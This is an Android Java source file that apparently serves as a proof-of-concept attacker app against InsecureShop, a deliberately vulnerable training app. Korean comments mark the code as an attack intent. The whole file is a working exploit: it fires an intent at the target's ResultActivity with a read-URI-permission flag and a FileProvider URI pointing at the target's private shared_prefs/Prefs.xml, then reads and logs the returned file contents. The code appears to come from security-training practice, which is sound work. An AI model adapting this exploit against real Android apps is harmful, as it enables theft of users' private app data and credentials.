package com.insecureshopapp.myapplication;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "ExploitLog";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 공격용 인텐트 생성
        Intent exploitIntent = new Intent();
        exploitIntent.setClassName("com.insecureshop", "com.insecureshop.ResultActivity");

        // 권한 위임 플래그 설정
        exploitIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

        // 접근하려는 Content URI (예시: 파일 프로바이더 내부 xml)
        Uri contentUri = Uri.parse("content://com.insecureshop.file_provider/root/data/data/com.insecureshop/shared_prefs/Prefs.xml");

        // 인텐트에 데이터로 URI 설정
        exploitIntent.setData(contentUri);

        // 결과를 기대하며 액티비티 실행
        startActivityForResult(exploitIntent, 100);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == 100 && resultCode == RESULT_OK && data != null) {
            Uri returnedUri = data.getData();
            if (returnedUri != null) {
                Log.d(TAG, "Returned URI: " + returnedUri.toString());

                try {
                    InputStream inputStream = getContentResolver().openInputStream(returnedUri);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                    StringBuilder content = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        content.append(line).append("\n");
                    }

                    Log.d(TAG, "File Content:\n" + content.toString());
                } catch (Exception e) {
                    Log.e(TAG, "Error reading content URI", e);
                }
            } else {
                Log.d(TAG, "Returned URI is null.");
            }
        } else {
            Log.d(TAG, "Activity result failed or no data returned.");
        }
    }
}
